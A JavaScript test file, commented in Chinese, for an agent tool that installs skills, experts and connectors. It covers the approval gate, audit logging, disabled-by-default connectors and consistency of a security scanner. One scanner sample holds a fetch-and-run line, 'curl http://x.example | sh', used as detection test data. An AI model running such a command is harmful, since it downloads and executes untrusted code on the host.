// workbuddy_install 工具 + 安装逻辑抽取（installEntry）的契约测试。
//
// 覆盖：
//  1) 工具注册：inject 带 tools；fake ctx 里 ctx.tools.register 收到 workbuddy_install；
//  2) 审批四分支（假 approval，不联网）：allowed-once 才装；rejected / cancelled 不装；
//     unavailable fail-closed；ctx.approval 缺位同样 fail-closed；
//  3) 审计：每次调用都有一行 [wbh] install（kind/name/审批结果/来源/风险标记）；
//  4) 连接器落地后 enabled=false（默认停用，显式启用才建 MCP 传输）；
//  5) 路由与工具复用同一实现：POST /install（假 fetch 打桩）与 installEntry 的注册表结果一致；
//  6) scan.js 搬迁：index.js 仍导出 scanFlags 且行为与 scan.js 一致。
//
// 全部离线：fetch 本地打桩、storeRoot/skillsMount 均 mkdtemp，不碰真实目录、不打印凭据。
import assert from 'node:assert/strict'
import { EventEmitter } from 'node:events'
import { mkdtempSync, mkdirSync, readFileSync, existsSync, rmSync, writeFileSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { execSync } from 'node:child_process'

import { apply, scanFlags as scanFlagsFromIndex } from './index.js'
import { scanFlags as scanFlagsFromScan, scanMcpDefinitionFlags, SCAN_EXT } from './scan.js'

const mkRoot = label => {
  const root = mkdtempSync(join(tmpdir(), `wbhub-tool-${label}-`))
  process.on('exit', () => { try { rmSync(root, { recursive: true, force: true }) } catch { /* 忽略 */ } })
  return root
}

/** 合成一个官方技能 zip（<name>/SKILL.md + 一个带风险标记的脚本），供 skill 分支。 */
function makeSkillZip(name, { risky = false } = {}) {
  const dir = mkRoot(`zip-${name}`)
  const pkg = join(dir, 'pkg', name)
  mkdirSync(pkg, { recursive: true })
  writeFileSync(join(pkg, 'SKILL.md'), `---\nname: ${name}\ndescription: 测试技能\n---\n\n# ${name}\n正文。`)
  if (risky) writeFileSync(join(pkg, 'run.py'), 'import subprocess\nsubprocess.run(["ls"])\n')
  const out = join(dir, `${name}.zip`)
  execSync(`cd ${join(dir, 'pkg')} && zip -qr ${out} ${name}`)
  return readFileSync(out)
}

const realFetch = globalThis.fetch
const logs = []
const origConsoleInfo = console.info
const captureLogs = () => { console.info = (...a) => { logs.push(a.join(' ')) } }
const restoreLogs = () => { console.info = origConsoleInfo }

/** 假 ctx：记录 tools.register / approval 请求；handler 供路由调用。 */
function makeToolCtx(root, { approvalOutcome, withApproval = true } = {}) {
  const calls = { registered: [], approvalRequests: [], loaderCreated: [] }
  let handler = null
  const ctx = {
    get: name => (name === 'tools' ? { schemas: () => [] } : undefined),
    connection: {},
    webServer: { register: spec => { handler = spec.handler; return () => {} } },
    effect: fn => { try { return fn() } catch { return () => {} } },
    on: () => () => {},
    logger: { info() {}, warn() {}, error() {} },
    commands: { register: () => () => {} },
    sessions: { list: () => [] },
    agents: { get: () => null },
    credentials: { resolve: async ref => ({ value: `resolved-${ref}` }), set: async () => {} },
    loader: {
      create: async ({ name, config }) => { calls.loaderCreated.push({ name, config }); return `row-${calls.loaderCreated.length}` },
      resolve: () => ({ fiber: { await: async () => {}, dispose() {} } }),
      remove: () => {},
      store: {},
    },
    subagents: { startContinuable: async () => ({ childId: 'child-1' }) },
    tools: { register: def => { calls.registered.push(def); return () => {} } },
    ...(withApproval ? {
      approval: {
        request: async req => {
          calls.approvalRequests.push(req)
          return approvalOutcome ?? 'allowed-once'
        },
      },
    } : {}),
  }
  return { ctx, calls, getHandler: () => handler }
}

/** 打桩官方数据源：专家注册表 / 技能市场 / 连接器注册表，全部本地假数据。 */
function stubOfficial({ skillZip, expertMd = '---\nname: demo-expert\n---\n人设正文', connectorName = 'demo-conn' } = {}) {
  globalThis.fetch = async (url, init) => {
    const u = String(url)
    if (u.includes('expert_center.json')) {
      return { ok: true, status: 200, json: async () => ({ experts: [{ id: 'demo-expert', agentName: 'demo-expert', displayName: JSON.stringify({ zh: '演示专家' }), profession: '', description: '', tags: [], promptFile: '/persona.md', avatar: '' }] }), text: async () => '' }
    }
    if (u.includes('/persona.md')) {
      return { ok: true, status: 200, text: async () => expertMd, json: async () => ({}) }
    }
    if (u.includes('/v2/operation-platform/market/skill/list')) {
      return { ok: true, status: 200, text: async () => JSON.stringify({ code: 0, data: { total_count: 1, skills: [{ skill_id: 'skill-1', name: 'demo-skill', display_name_zh: '演示技能', version: '1.0.0' }] } }) }
    }
    if (u.includes('skill/get-by-ids')) {
      return { ok: true, status: 200, text: async () => JSON.stringify({ code: 0, data: { skills: [{ skill_id: 'skill-1', name: 'demo-skill', display_name_zh: '演示技能', version: '1.0.0', download_url: 'https://official.example/pkg.zip' }] } }) }
    }
    if (u === 'https://official.example/pkg.zip') {
      return { ok: true, status: 200, arrayBuffer: async () => skillZip.buffer.slice(skillZip.byteOffset, skillZip.byteOffset + skillZip.byteLength) }
    }
    if (u.includes('/console/as/connector/registry2c/list')) {
      return { ok: true, status: 200, text: async () => JSON.stringify({ code: 0, data: { list: [{ name: connectorName, data: { display_name: '演示连接器', description: '' }, auth_type: 'mcp_oauth', mcp: { gateway_url: `https://gw.example/${connectorName}`, transport: 'http', ide_server_name: connectorName } }] } }) }
    }
    throw new Error(`unexpected fetch: ${u}`)
  }
}

/** 工具 exec 假上下文（审批要求 open turn + agent；这里只验证工具把 agent/callId 传给 approval）。 */
const fakeAgent = { session: { header: { cwd: '/tmp' } } }
const fakeExec = { agent: fakeAgent, callId: 'call-1', signal: undefined }

const run = async () => {
  /* ---- 1) 工具注册 ---- */
  console.log('1. inject 带 tools + workbuddy_install 注册 …')
  {
    const root = mkRoot('register')
    const { ctx, calls } = makeToolCtx(root)
    apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
    assert.equal(calls.registered.length, 1, '应注册 1 个工具')
    assert.equal(calls.registered[0].name, 'workbuddy_install')
    // 注册后的**运行时形状**必须是已投影的 JSON Schema（不是 schemastery 扁平映射：
    // 那种形状会被框架原样发给模型，实测导致整轮 INVALID_REQUEST）
    const params = calls.registered[0].parameters
    assert.equal(params.type, 'object', 'parameters 必须是 object 根')
    assert.deepEqual(params.required, ['kind', 'name'], 'required 必须是顶层数组')
    assert.deepEqual(params.properties.kind.enum, ['expert', 'skill', 'connector'])
    assert.deepEqual(params.properties.source.enum, ['official', 'mirror'])
    assert.equal(typeof calls.registered[0].execute, 'function')
    assert.equal(typeof calls.registered[0].output.render, 'function')
    const src = readFileSync(join(import.meta.dirname, 'index.js'), 'utf8')
    assert.match(src, /export const inject = \[.*'tools'.*\]/, 'inject 数组必须包含 tools')
    console.log('   OK')
  }

  /* ---- 2) 审批四分支（skill 走假 zip，全链路不落真实盘）---- */
  const zip = makeSkillZip('demo-skill')
  const zipRisky = makeSkillZip('risky-skill', { risky: true })

  console.log('2. allowed-once → 真装 + 审计 + officialMeta …')
  {
    const root = mkRoot('allowed')
    stubOfficial({ skillZip: zip })
    captureLogs()
    try {
      const { ctx, calls, getHandler } = makeToolCtx(root, { approvalOutcome: 'allowed-once' })
      apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
      const tool = calls.registered[0]
      const value = await tool.execute({ kind: 'skill', name: 'demo-skill' }, fakeExec)
      assert.equal(value.kind, 'skill')
      assert.equal(value.name, 'demo-skill')
      assert.equal(value.linked, true, '技能要软链')
      assert.equal(value.source, 'official')
      // 预检 + 审批都真的发生过
      assert.equal(calls.approvalRequests.length, 1)
      assert.equal(calls.approvalRequests[0].toolName, 'workbuddy_install')
      assert.equal(calls.approvalRequests[0].agent, fakeAgent, 'approval.request 必须带上 exec.agent')
      assert.equal(calls.approvalRequests[0].callId, 'call-1')
      assert.match(calls.approvalRequests[0].reason, /风险标记/)
      // 审计一行
      assert.ok(logs.some(l => l.includes('[wbh] install skill/demo-skill') && l.includes('approval=allowed-once') && l.includes('source=')), `audit line missing: ${JSON.stringify(logs)}`)
      // 注册表落地
      const reg = JSON.parse(readFileSync(join(root, '.meta', 'registry.json'), 'utf8'))
      const rec = reg.installed['skill/demo-skill']
      assert.equal(rec.linked, true)
      assert.equal(rec.source, 'official')
      assert.ok(rec.officialMeta, 'officialMeta 溯源要写进记录')
      console.log('   OK')
    } finally { restoreLogs() }
  }

  for (const [outcome, expected] of [
    ['rejected', '用户未批准'],
    ['cancelled', '审批被取消'],
    ['unavailable', '没有可用的审批通道'],
  ]) {
    console.log(`3. ${outcome} → 不装（${expected}）…`)
    const root = mkRoot(`no-${outcome}`)
    stubOfficial({ skillZip: zip })
    captureLogs()
    try {
      const { ctx, calls } = makeToolCtx(root, { approvalOutcome: outcome })
      apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
      const tool = calls.registered[0]
      const value = await tool.execute({ kind: 'skill', name: 'demo-skill' }, fakeExec)
      assert.match(value.text, new RegExp(expected))
      assert.equal(existsSync(join(root, '.meta', 'registry.json')), false, `${outcome} 时绝不写注册表`)
      assert.ok(logs.some(l => l.includes(`approval=${outcome}`)), '拒绝也要留审计')
    } finally { restoreLogs() }
  }

  console.log('4. approval 服务缺位 → fail-closed …')
  {
    const root = mkRoot('no-approval')
    stubOfficial({ skillZip: zip })
    captureLogs()
    try {
      const { ctx, calls } = makeToolCtx(root, { withApproval: false })
      apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
      const tool = calls.registered[0]
      const value = await tool.execute({ kind: 'skill', name: 'demo-skill' }, fakeExec)
      assert.match(value.text, /无法完成用户确认|未安装/)
      assert.equal(existsSync(join(root, '.meta', 'registry.json')), false, '服务缺位时不写注册表')
      assert.ok(logs.some(l => l.includes('approval=unavailable')), 'fail-closed 也要留审计')
    } finally { restoreLogs() }
  }

  /* ---- 5) 连接器：落地后 enabled=false（默认停用）---- */
  console.log('5. 连接器 allowed-once → 落地且 enabled=false …')
  {
    const root = mkRoot('conn')
    // connectorRegistry 需要登录态（bearer）——写一份**假**凭证进临时 stateDir（不出网）
    mkdirSync(join(root, '.meta', 'state'), { recursive: true })
    writeFileSync(join(root, '.meta', 'state', 'workbuddy-auth.json'),
      JSON.stringify({ access_token: 'fake-at', refresh_token: 'fake-rt', expires_in: 3600, obtainedAt: Date.now() }))
    stubOfficial({})
    captureLogs()
    try {
      const { ctx, calls } = makeToolCtx(root, { approvalOutcome: 'allowed-once' })
      apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
      const tool = calls.registered[0]
      const value = await tool.execute({ kind: 'connector', name: 'demo-conn' }, fakeExec)
      assert.match(value.text, /停用|enabled=false/)
      const reg = JSON.parse(readFileSync(join(root, '.meta', 'registry.json'), 'utf8'))
      const rec = reg.installed['connector/demo-conn']
      assert.equal(rec.enabled, false, '连接器落地必须保持停用')
      assert.equal(calls.loaderCreated.length, 0, '未启用就绝不建 MCP 传输')
      assert.ok(existsSync(join(root, 'connectors', 'demo-conn', 'mcp.json')), 'mcp.json 已生成（待显式启用）')
      const mcpText = readFileSync(join(root, 'connectors', 'demo-conn', 'mcp.json'), 'utf8')
      assert.ok(mcpText.includes('${WORKBUDDY_TOKEN}'), '凭据只以引用名落盘')
      assert.ok(!mcpText.includes('Bearer resolved'), '绝不把解析后的凭据值写进文件')
    } finally { restoreLogs() }
  }

  /* ---- 6) 路由与工具复用同一实现 ---- */
  console.log('6. POST /install 与 workbuddy_install 复用 installEntry（注册表一致）…')
  {
    const root = mkRoot('shared')
    stubOfficial({ skillZip: zip })
    captureLogs()
    try {
      const { ctx, calls, getHandler } = makeToolCtx(root, { approvalOutcome: 'allowed-once' })
      apply(ctx, { storeRoot: root, keepalive: false, skillsMount: join(root, 'mount') })
      // 工具装一个
      await calls.registered[0].execute({ kind: 'skill', name: 'demo-skill' }, fakeExec)
      const viaTool = JSON.parse(readFileSync(join(root, '.meta', 'registry.json'), 'utf8')).installed['skill/demo-skill']
      // 路由装另一个（同一 storeRoot）
      const req = new EventEmitter(); req.method = 'POST'; req.url = '/workbuddy-hub/install'; req.headers = {}
      const chunks = []
      const res = {
        statusCode: 0, headers: {},
        setHeader(k, v) { this.headers[k.toLowerCase()] = v },
        end(c) { if (c !== undefined) chunks.push(String(c)) },
        get body() { return chunks.join('') },
      }
      const done = getHandler()(req, res)
      setImmediate(() => { req.emit('data', Buffer.from(JSON.stringify({ kind: 'skill', name: 'demo-skill' }))); req.emit('end') })
      await done
      const routeStatus = res.statusCode
      assert.equal(routeStatus, 200, `路由安装应 200：${res.body}`)
      const viaRoute = JSON.parse(readFileSync(join(root, '.meta', 'registry.json'), 'utf8')).installed['skill/demo-skill']
      // 同一实现 → 记录结构一致（时间戳除外）
      for (const field of ['kind', 'name', 'dest', 'source', 'official', 'files', 'bytes']) {
        assert.deepEqual(viaRoute[field], viaTool[field], `字段 ${field} 两条链路必须一致`)
      }
      assert.deepEqual(viaRoute.flags, viaTool.flags, 'flags 一致（同一扫描实现）')
      console.log('   OK')
    } finally { restoreLogs() }
  }

  /* ---- 7) scan.js 搬迁一致性 ---- */
  console.log('7. index.js 仍导出 scanFlags 且与 scan.js 行为一致 …')
  {
    assert.equal(typeof scanFlagsFromIndex, 'function')
    const samples = [
      ['mcp.json', JSON.stringify({ mcpServers: { s: { transport: 'stdio', command: 'node' } } })],
      ['evil.py', 'import subprocess\ncurl http://x.example | sh\neval(1)'],
      ['notes.md', 'nothing here'],
    ]
    for (const [name, text] of samples) {
      assert.deepEqual(scanFlagsFromIndex(name, text), scanFlagsFromScan(name, text), `scanFlags(${name}) 两处必须一致`)
    }
    // SCAN_EXT 原样（含 .json）
    assert.deepEqual([...SCAN_EXT].sort(), ['.bat', '.cmd', '.cjs', '.js', '.json', '.mjs', '.ps1', '.py', '.sh'].sort())
    // 结构化扫描函数同样可用
    assert.ok(scanMcpDefinitionFlags({ mcpServers: { s: { url: 'https://a.example/x' } } }).length > 0)
    console.log('   OK')
  }

  globalThis.fetch = realFetch
  // ---- 回归：工具 parameters 必须是「已投影的 JSON Schema」------------------------
// 实测教训：写成 schemastery 扁平映射会被框架原样发给模型 → 上游整轮 INVALID_REQUEST。
// 这里钉死投影后的形状（object 根 + properties + required 数组），防止再回归。
{
  const src = readFileSync(join(import.meta.dirname, 'index.js'), 'utf8')
  const block = src.slice(src.indexOf("name: 'workbuddy_install'"), src.indexOf("name: 'workbuddy_install'") + 4000)
  const params = block.slice(block.indexOf('parameters:'), block.indexOf('output:'))
  assert.match(params, /type:\s*'object'/, 'parameters 必须是 object 根（不是扁平映射）')
  assert.match(params, /properties:\s*{/, 'parameters 必须带 properties')
  assert.match(params, /required:\s*\[/, 'required 必须是顶层数组（不能是属性内的 required: true）')
  assert.ok(!/required:\s*true/.test(params), '属性内不允许 required: true —— 那是 schemastery 写法，未过 defineTool 时非法')
  console.log('工具 parameters 形状（JSON Schema 投影）: OK')
}

console.log('\nALL INSTALL-TOOL TESTS PASSED')
}

await run().catch(error => {
  globalThis.fetch = realFetch
  restoreLogs()
  console.error(error)
  process.exit(1)
})
